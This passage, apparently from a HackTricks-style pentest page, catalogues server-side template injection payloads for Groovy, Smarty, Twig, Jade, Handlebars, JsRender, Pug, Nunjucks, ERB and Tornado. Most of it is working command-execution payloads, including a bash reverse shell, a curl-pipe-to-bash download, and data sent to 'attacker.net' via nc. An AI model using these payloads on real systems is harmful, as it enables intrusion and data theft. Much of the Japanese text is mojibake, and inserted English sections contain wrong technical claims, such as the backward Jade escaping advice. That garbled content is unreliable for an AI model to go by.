this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/)ã¯ã€**ã‚¹ãƒšã‚¤ãƒ³**ã§æœ€ã‚‚é–¢é€£æ€§ã®é«˜ã„ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¤ãƒ™ãƒ³ãƒˆã§ã‚ã‚Šã€**ãƒ¨ãƒ¼ãƒ­ãƒƒãƒ‘**ã§ã‚‚æœ€ã‚‚é‡è¦ãªã‚¤ãƒ™ãƒ³ãƒˆã®ä¸€ã¤ã§ã™ã€‚**æŠ€è¡“çš„ãªçŸ¥è­˜ã®ä¿ƒé€²ã‚’ä½¿å‘½ã¨ã—ã¦**ã€ã“ã®ä¼šè­°ã¯ã‚ã‚‰ã‚†ã‚‹åˆ†é‡ã®ãƒ†ã‚¯ãƒãƒ­ã‚¸ãƒ¼ã¨ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®å°‚é–€å®¶ã®ç†±ã„äº¤æµã®å ´ã§ã™ã€‚

{% embed url="https://www.rootedcon.com/" %}

##

### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
**è©³ç´°æƒ…å ±**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)ã®Smartyã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§è©³ç´°ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

### Twig (PHP)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{7*'7'}} = 49`
* `{{1/0}} = ã‚¨ãƒ©ãƒ¼`
* `{{foobar}} ä½•ã‚‚è¡¨ç¤ºã•ã‚Œã¾ã›ã‚“`
```python
#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
```
**Twig - ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå½¢å¼**

Twigã¯ã€PHPã®ãŸã‚ã®æŸ”è»Ÿã§å¼·åŠ›ãªãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã§ã™ã€‚ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã§å¤‰æ•°ã‚„åˆ¶å¾¡æ§‹é€ ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚Twigã¯ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’é‡è¦–ã—ã¦ãŠã‚Šã€ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ï¼ˆSSTIï¼‰æ”»æ’ƒã‹ã‚‰ä¿è­·ã™ã‚‹ãŸã‚ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ©Ÿèƒ½ã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚

**SSTIï¼ˆã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ï¼‰ã¨ã¯ä½•ã§ã™ã‹ï¼Ÿ**

ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ï¼ˆSSTIï¼‰ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã‚’ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã«ç›´æ¥åŸ‹ã‚è¾¼ã‚€å ´åˆã«ç™ºç”Ÿã™ã‚‹è„†å¼±æ€§ã§ã™ã€‚æ”»æ’ƒè€…ã¯ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã§å®Ÿè¡Œã•ã‚Œã‚‹ã‚³ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ã«ã‚ˆã‚Šã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆå†…ã§ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

**Twigãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã§ã®SSTIæ”»æ’ƒã®æ¤œå‡ºæ–¹æ³•**

SSTIæ”»æ’ƒã‚’æ¤œå‡ºã™ã‚‹ãŸã‚ã«ã¯ã€ä»¥ä¸‹ã®æ‰‹é †ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

1. ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã®å¤‰æ•°ã®å‡ºåŠ›ã‚’ç¢ºèªã—ã¾ã™ã€‚å¤‰æ•°ãŒç›´æ¥å‡ºåŠ›ã•ã‚Œã¦ã„ã‚‹å ´åˆã€SSTIæ”»æ’ƒã®å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
2. ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã§ã®åˆ¶å¾¡æ§‹é€ ï¼ˆifæ–‡ã€forãƒ«ãƒ¼ãƒ—ãªã©ï¼‰ã®ä½¿ç”¨ã‚’ç¢ºèªã—ã¾ã™ã€‚åˆ¶å¾¡æ§‹é€ ãŒä¸æ­£ãªå…¥åŠ›ã«åŸºã¥ã„ã¦å‹•çš„ã«ç”Ÿæˆã•ã‚Œã¦ã„ã‚‹å ´åˆã€SSTIæ”»æ’ƒã®ãƒªã‚¹ã‚¯ãŒã‚ã‚Šã¾ã™ã€‚
3. ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã§ã®é–¢æ•°ã®ä½¿ç”¨ã‚’ç¢ºèªã—ã¾ã™ã€‚ç‰¹ã«ã€å±é™ºãªé–¢æ•°ï¼ˆä¾‹ï¼ševal()ï¼‰ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€SSTIæ”»æ’ƒã®å¯èƒ½æ€§ãŒé«˜ã„ã§ã™ã€‚

**SSTIæ”»æ’ƒã®é˜²æ­¢æ–¹æ³•**

SSTIæ”»æ’ƒã‚’é˜²ããŸã‚ã«ã¯ã€ä»¥ä¸‹ã®å¯¾ç­–ã‚’å®Ÿæ–½ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚

1. ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã‚’ä¿¡é ¼ã§ãã‚‹å½¢å¼ã«å¤‰æ›ã™ã‚‹ãŸã‚ã«ã€å…¥åŠ›ã®ãƒãƒªãƒ‡ãƒ¼ã‚·ãƒ§ãƒ³ã¨ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†ã‚’è¡Œã„ã¾ã™ã€‚
2. ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã§ã®å‹•çš„ãªã‚³ãƒ¼ãƒ‰ç”Ÿæˆã‚’é¿ã‘ã‚‹ãŸã‚ã«ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã§ã®åˆ¶å¾¡æ§‹é€ ã‚„é–¢æ•°ã®ä½¿ç”¨ã‚’æœ€å°é™ã«æŠ‘ãˆã¾ã™ã€‚
3. ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ„è­˜ã®é«˜ã„ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ï¼ˆä¾‹ï¼šTwigï¼‰ã‚’ä½¿ç”¨ã—ã€SSTIæ”»æ’ƒã‹ã‚‰ã®ä¿è­·ã‚’å¼·åŒ–ã—ã¾ã™ã€‚

**SSTIæ”»æ’ƒã®å½±éŸ¿**

SSTIæ”»æ’ƒã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ä»¥ä¸‹ã®ã‚ˆã†ãªå½±éŸ¿ã‚’ä¸ãˆã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

1. ã‚µãƒ¼ãƒãƒ¼ä¸Šã§ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
2. ã‚µãƒ¼ãƒãƒ¼ä¸Šã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€æ©Ÿå¯†æƒ…å ±ã‚’ç›—ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚
3. ã‚µãƒ¼ãƒãƒ¼ä¸Šã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€ãƒ‡ãƒ¼ã‚¿ã‚’æ”¹ã–ã‚“ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

SSTIæ”»æ’ƒã¯æ·±åˆ»ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒªã‚¹ã‚¯ã§ã‚ã‚‹ãŸã‚ã€é©åˆ‡ãªå¯¾ç­–ã‚’è¬›ã˜ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚
```php
$output = $twig > render (
'Dear' . $_GET['custom_greeting'],
array("first_name" => $user.first_name)
);

$output = $twig > render (
"Dear {first_name}",
array("first_name" => $user.first_name)
);
```
**è©³ç´°æƒ…å ±**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)ã®Twigã¨Twigï¼ˆSandboxedï¼‰ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§è©³ç´°ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

### Platesï¼ˆPHPï¼‰

Platesã¯Twigã«è§¦ç™ºã•ã‚ŒãŸã‚‚ã®ã§ã€ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã§ã¯ãªãã€ãƒã‚¤ãƒ†ã‚£ãƒ–ã®PHPãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã§ã™ã€‚

ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼ï¼š
```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```
ãƒšãƒ¼ã‚¸ã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆï¼š
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```
ãƒ¬ã‚¤ã‚¢ã‚¦ãƒˆãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆï¼š
```html
<html>
<head>
<title><?=$this->e($title)?></title>
</head>
<body>
<?=$this->section('content')?>
</body>
</html>
```
### PHPlibã¨HTML\_Template\_PHPLIBï¼ˆPHPï¼‰

[HTML\_Template\_PHPLIB](https://github.com/pear/HTML\_Template\_PHPLIB)ã¯PHPlibã¨åŒã˜ã§ã™ãŒã€Pearã«ç§»æ¤ã•ã‚Œã¦ã„ã¾ã™ã€‚

`authors.tpl`
```html
<html>
<head><title>{PAGE_TITLE}</title></head>
<body>
<table>
<caption>Authors</caption>
<thead>
<tr><th>Name</th><th>Email</th></tr>
</thead>
<tfoot>
<tr><td colspan="2">{NUM_AUTHORS}</td></tr>
</tfoot>
<tbody>
<!-- BEGIN authorline -->
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
</tbody>
</table>
</body>
</html>
```
# SSTI (Server-Side Template Injection) - authors.php

## Description

The `authors.php` file is a vulnerable PHP script that is susceptible to Server-Side Template Injection (SSTI) attacks. SSTI occurs when user-supplied input is directly embedded into a server-side template, allowing an attacker to execute arbitrary code on the server.

## Exploitation

To exploit the SSTI vulnerability in `authors.php`, an attacker can inject malicious code into the `author` parameter. This parameter is used to dynamically include a template file based on the author's name.

The vulnerable code looks like this:

```php
$author = $_GET['author'];
include('templates/' . $author . '.php');
```

By manipulating the `author` parameter, an attacker can inject arbitrary PHP code into the template file and execute it on the server.

## Example

Suppose the URL to access `authors.php` is `http://example.com/authors.php?author=John`. An attacker can exploit the SSTI vulnerability by injecting PHP code into the `author` parameter, like this:

```
http://example.com/authors.php?author={{7*7}}
```

This will result in the inclusion of the `templates/49.php` file, as the expression `{{7*7}}` is evaluated to `49`. If the `templates/49.php` file contains arbitrary PHP code, it will be executed on the server.

## Impact

Server-Side Template Injection can have severe consequences, including:

- Remote code execution
- Information disclosure
- Server compromise

## Prevention

To prevent SSTI attacks, it is important to:

- Validate and sanitize user input before using it in server-side templates
- Avoid directly embedding user input into templates
- Use a secure template engine that automatically escapes user input

By following these best practices, you can mitigate the risk of SSTI vulnerabilities in your web applications.
```php
<?php
//we want to display this author list
$authors = array(
'Christian Weiske'  => 'cweiske@php.net',
'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
$t->setVar('AUTHOR_NAME', $name);
$t->setVar('AUTHOR_EMAIL', $email);
$t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```
### Jade (NodeJS)

Jade is a popular template engine for NodeJS that allows you to generate HTML dynamically. It is known for its simplicity and ease of use. However, it is important to be aware of the security risks associated with using Jade, particularly when it comes to Server-Side Template Injection (SSTI) vulnerabilities.

#### Server-Side Template Injection (SSTI)

Server-Side Template Injection occurs when user-supplied data is embedded directly into a template, allowing an attacker to execute arbitrary code on the server. This can lead to serious security breaches, such as unauthorized access to sensitive data or the execution of malicious commands.

#### Identifying SSTI Vulnerabilities

To identify SSTI vulnerabilities in Jade templates, you can look for the following indicators:

1. **Untrusted user input**: Any user-supplied data that is directly embedded into the template without proper sanitization is a potential vulnerability.
2. **Template tags**: Look for template tags that allow code execution, such as `#{}` or `!{}`. These tags should only be used with trusted data.
3. **Template expressions**: Check for template expressions that evaluate user-supplied data, such as `#{userInput}`. If the data is not properly sanitized, it can lead to SSTI vulnerabilities.

#### Exploiting SSTI Vulnerabilities

If you discover an SSTI vulnerability in a Jade template, an attacker can exploit it by injecting malicious code into the template. This can be done by manipulating user-supplied data to execute arbitrary commands or access sensitive information.

#### Preventing SSTI Vulnerabilities

To prevent SSTI vulnerabilities in Jade templates, follow these best practices:

1. **Input validation and sanitization**: Always validate and sanitize user input before embedding it into a template. Use proper input validation techniques to ensure that only trusted data is used.
2. **Context-aware escaping**: Use context-aware escaping techniques to prevent code injection. For example, use the `!{}` syntax instead of `#{}` when embedding user-supplied data.
3. **Template whitelisting**: Maintain a whitelist of allowed template tags and expressions. Only allow trusted tags and expressions to be used in the templates.
4. **Regular updates**: Keep your Jade template engine up to date with the latest security patches and updates to mitigate any known vulnerabilities.

By following these best practices, you can minimize the risk of SSTI vulnerabilities in your Jade templates and ensure the security of your NodeJS applications.
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
**è©³ç´°æƒ…å ±**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)ã®Jadeã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§è©³ç´°ã‚’ç¢ºèªã§ãã¾ã™ã€‚
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

### patTemplate (PHP)

> [patTemplate](https://github.com/wernerwa/pat-template)ã¯ã€éã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã®PHPãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã§ã€XMLã‚¿ã‚°ã‚’ä½¿ç”¨ã—ã¦ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’ç•°ãªã‚‹éƒ¨åˆ†ã«åˆ†å‰²ã—ã¾ã™ã€‚
```xml
<patTemplate:tmpl name="page">
This is the main page.
<patTemplate:tmpl name="foo">
It contains another template.
</patTemplate:tmpl>
<patTemplate:tmpl name="hello">
Hello {NAME}.<br/>
</patTemplate:tmpl>
</patTemplate:tmpl>
```
### Handlebars (NodeJS)

ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ï¼ˆè©³ç´°ã¯[ã“ã¡ã‚‰](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)ã‚’å‚ç…§ï¼‰ã€‚
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```
# SSTI (Server-Side Template Injection)

## æ¦‚è¦

SSTIï¼ˆServer-Side Template Injectionï¼‰ã¯ã€ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®è„†å¼±æ€§ã§ã‚ã‚Šã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ãŒä¸é©åˆ‡ã«ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã«ç™ºç”Ÿã—ã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã®æ©Ÿèƒ½ã‚’æ‚ªç”¨ã—ã¦ã€ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## ã‚¨ãƒ©ãƒ¼

ä»¥ä¸‹ã®ã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚

```
\= ã‚¨ãƒ©ãƒ¼
```

## å¼ã®è©•ä¾¡

ä»¥ä¸‹ã®å¼ãŒè©•ä¾¡ã•ã‚Œã¾ã™ã€‚

```
${7\*7} = ${7\*7}
```

## ä½•ã‚‚è¡¨ç¤ºã•ã‚Œãªã„

ä½•ã‚‚è¡¨ç¤ºã•ã‚Œã¾ã›ã‚“ã€‚
```java
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

URLencoded:
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```
**è©³ç´°æƒ…å ±**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRender (NodeJS)

| **ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆ** | **èª¬æ˜**                                 |
| -------------- | --------------------------------------- |
|                | è©•ä¾¡ã—ã¦å‡ºåŠ›ã‚’ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã™ã‚‹              |
|                | è©•ä¾¡ã—ã¦HTMLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸå‡ºåŠ›ã‚’ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã™ã‚‹ |
|                | ã‚³ãƒ¡ãƒ³ãƒˆ                                 |
| ãã—ã¦          | ã‚³ãƒ¼ãƒ‰ã‚’è¨±å¯ã™ã‚‹ï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ç„¡åŠ¹ï¼‰        |

* \= 49

**ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰**
```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```
**ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰**
```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
**è©³ç´°æƒ…å ±**

* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã®ä¾‹**
```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```
**è©³ç´°æƒ…å ±**

* [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = å‡ºåŠ›ãªã—
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = ã‚¨ãƒ©ãƒ¼
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```
**è©³ç´°æƒ…å ±**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

### ERB (Ruby)

* `{{7*7}} = {{7*7}}`
* `${7*7} = ${7*7}`
* `<%= 7*7 %> = 49`
* `<%= foobar %> = ã‚¨ãƒ©ãƒ¼`
```python
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
**è©³ç´°æƒ…å ±**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Slim (Ruby)

* `{ 7 * 7 }`
```
{ %x|env| }
```
**è©³ç´°æƒ…å ±**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Python

ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã€Pythonã§ã®**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰å®Ÿè¡Œã®ãƒˆãƒªãƒƒã‚¯**ã‚’å­¦ã³ã¾ã—ã‚‡ã†ï¼š

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Tornado (Python)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{foobar}} = ã‚¨ãƒ©ãƒ¼`
* `{{7*'7'}} = 7777777`
```python
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}




{{os.system('whoami')}}
